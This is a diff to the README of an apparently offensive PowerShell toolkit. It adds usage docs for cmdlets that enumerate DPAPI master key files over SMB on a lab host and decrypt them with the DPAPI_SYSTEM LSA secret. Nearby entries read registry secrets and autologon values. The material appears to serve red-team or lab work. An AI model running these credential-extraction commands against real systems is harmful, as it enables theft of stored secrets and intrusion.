@@ -459,6 +459,30 @@ Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Inclu
 Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeMissing
 ```
 
+#### Get-TBODpapiMasterKeyLocations
+
+Enumerates DPAPI master key files for machine and user scopes over SMB and marks preferred keys when possible.
+Writes progress to the console with the current path being scanned.
+
+```powershell
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -ShareName C$
+```
+
+#### Get-TBODpapiMasterKeys
+
+Decrypts DPAPI master keys using DPAPI_SYSTEM from LSA secrets.
+Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw key bytes.
+
+```powershell
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -DpapiMachineKey <hex> -DpapiUserKey <hex>
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$
+```
+
 #### Get-TBORegAutoLogon
 
 Reads autologon configuration values from the Winlogon registry key.
